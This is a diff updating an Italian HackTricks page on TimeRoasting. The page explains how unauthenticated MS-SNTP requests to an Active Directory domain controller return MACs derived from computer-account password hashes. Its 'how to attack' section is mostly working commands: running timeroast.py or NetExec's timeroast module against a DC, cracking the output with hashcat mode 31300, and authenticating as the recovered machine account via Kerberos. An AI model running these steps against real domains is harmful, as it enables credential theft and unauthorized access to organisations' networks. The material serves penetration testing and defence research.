@@ -2,23 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-TimeRoasting sfrutta l'estensione legacy di autenticazione MS-SNTP. In MS-SNTP, un client può inviare una richiesta di 68 byte che include il RID di qualsiasi account computer; il domain controller utilizza l'hash NTLM (MD4) dell'account computer come chiave per calcolare un MAC sulla risposta e lo restituisce.<sup>[[1]](#references)</sup> Gli attacker possono raccogliere questi MAC MS-SNTP senza autenticazione ed eseguire il cracking offline (modalità Hashcat 31300) per recuperare le password degli account computer.<sup>[[2]](#references)</sup>
+TimeRoasting sfrutta l'autenticazione legacy MS-SNTP. Un client non autenticato può inviare una richiesta di 68 byte contenente un RID scelto dell'account computer. Nel percorso legacy vulnerabile, il domain controller deriva l'autenticatore della risposta tramite Netlogon usando l'hash NT dell'account computer (il secret della password derivato da MD4), fornendo all'attaccante una coppia challenge/MAC adatta al password guessing offline (modalità 31300 di Hashcat).<sup>[[1]](#references)[[2]](#references)</sup>
 
-Per i dettagli, consulta la sezione 3.1.5.1 "Authentication Request Behavior" e la sezione 4 "Protocol Examples" della specifica ufficiale MS-SNTP.<sup>[[1]](#references)</sup>
+Le sezioni 3.1.5.1 e 4 di MS-SNTP descrivono il comportamento della richiesta e della risposta:<sup>[[1]](#references)</sup>
 ![TimeRoasting: consulta la sezione 3.1.5.1 "Authentication Request Behavior" e la sezione 4 "Protocol Examples" della specifica ufficiale MS-SNTP per i dettagli](../../images/Pasted%20image%2020250709114508.png)
-Quando l'elemento ADM ExtendedAuthenticatorSupported è false, il client invia una richiesta di 68 byte e include il RID nei 31 bit meno significativi del sottocampo Key Identifier dell'autenticator.<sup>[[1]](#references)</sup>
+Quando `ExtendedAuthenticatorSupported` è false, la richiesta memorizza il RID nei 31 bit meno significativi del Key Identifier dell'autenticatore e un bit selettore nel bit più significativo. Il server verifica la lunghezza di 68 byte, estrae il RID, chiede a Netlogon di calcolare i checksum candidati, ne seleziona uno usando quel bit più significativo, azzera il Key Identifier della risposta e restituisce il checksum selezionato.<sup>[[1]](#references)</sup>
 
-> Se l'elemento ADM ExtendedAuthenticatorSupported è false, il client DEVE costruire un messaggio Client NTP Request. La lunghezza del messaggio Client NTP Request è di 68 byte. Il client imposta il campo Authenticator del messaggio Client NTP Request come descritto nella sezione 2.2.1, scrivendo i 31 bit meno significativi del valore RID nei 31 bit meno significativi del sottocampo Key Identifier dell'autenticator, quindi scrivendo il valore Key Selector nel bit più significativo del sottocampo Key Identifier.<sup>[[1]](#references)</sup>
-
-Dalla sezione 4 (Protocol Examples):
-
-> Dopo aver ricevuto la richiesta, il server verifica che la dimensione del messaggio ricevuto sia di 68 byte. Supponendo che la dimensione del messaggio ricevuto sia di 68 byte, il server estrae il RID dal messaggio ricevuto. Il server lo utilizza per chiamare il metodo NetrLogonComputeServerDigest (come specificato nella sezione 3.5.4.8.2 di [MS-NRPC]) per calcolare i crypto-checksum e selezionare il crypto-checksum in base al bit più significativo del sottocampo Key Identifier del messaggio ricevuto, come specificato nella sezione 3.2.5. Il server invia quindi una risposta al client, impostando il campo Key Identifier su 0 e il campo Crypto-Checksum sul crypto-checksum calcolato.<sup>[[1]](#references)</sup>
-
-Il crypto-checksum è basato su MD5 (vedi 3.2.5.1.1) e può essere sottoposto a cracking offline, consentendo l'attacco di roasting.<sup>[[1]](#references)</sup>
+Il crypto-checksum è basato su MD5 (vedi 3.2.5.1.1) e può essere craccato offline, rendendo possibile l'attacco di roasting.<sup>[[1]](#references)</sup>
 
 ## Come attaccare
 
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - script di Timeroasting di Tom Tervoort<sup>[[3]](#references)</sup>
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Script di Timeroasting di Tom Tervoort<sup>[[3]](#references)</sup>
 ```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
@@ -27,7 +21,7 @@ hashcat -m 31300 ntp-hashes.txt
 
 ## Attacco pratico (non autenticato) con NetExec + Hashcat
 
-- NetExec può enumerare e raccogliere i MAC MS-SNTP per i RID dei computer senza autenticazione e stampare gli hash `$sntp-ms$` pronti per il cracking:<sup>[[4]](#references)</sup>
+- Il modulo `timeroast` di NetExec può enumerare i RID dei computer, raccogliere i MAC MS-SNTP senza autenticazione e stampare gli hash `$sntp-ms$` pronti per il cracking:<sup>[[4]](#references)</sup>
 ```bash
 # Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
 netexec smb <dc_fqdn_or_ip> -M timeroast
@@ -38,22 +32,21 @@ netexec smb <dc_fqdn_or_ip> -M timeroast
 hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
 # or let recent hashcat auto-detect; keep RIDs with --username for convenience
 ```
-- Il testo in chiaro recuperato corrisponde alla password di un account computer. Provala direttamente come account macchina usando Kerberos (-k) quando NTLM è disabilitato:
+- La password in chiaro recuperata corrisponde alla password di un account computer. Provala direttamente come account macchina usando Kerberos (-k) quando NTLM è disabilitato:
 ```bash
 # Example: cracked for RID 1125 -> likely IT-COMPUTER3$
 netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
 ```
-Consigli operativi
-- Assicurati che la sincronizzazione dell'ora sia accurata prima di usare Kerberos: `sudo ntpdate <dc_fqdn>`
+### Note operative
+- Assicurati che l'ora sia accurata prima di usare le credenziali recuperate con Kerberos. Preferisci un client NTP mantenuto, come `chronyd`/`systemd-timesyncd`; `ntpdate` viene mantenuto qui come comando comune nei lab: `sudo ntpdate <dc_fqdn>`.
 - Se necessario, genera krb5.conf per il realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
-- Mappa in seguito i RID ai principals tramite LDAP/BloodHound una volta ottenuto un foothold autenticato.
+- Mappa in seguito i RID ai principal tramite LDAP/BloodHound, una volta ottenuto un foothold autenticato.
 
-## Riferimenti
+## References
 
 - [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
-- [2] [Secura – whitepaper sul Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+- [2] [Secura – whitepaper su Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
 - [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
-- [4] [NetExec – documentazione ufficiale](https://www.netexec.wiki/)
-- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
-
+- [4] [NetExec — sorgente del modulo `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
+- [5] [Modalità Hashcat 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
 {{#include ../../banners/hacktricks-training.md}}
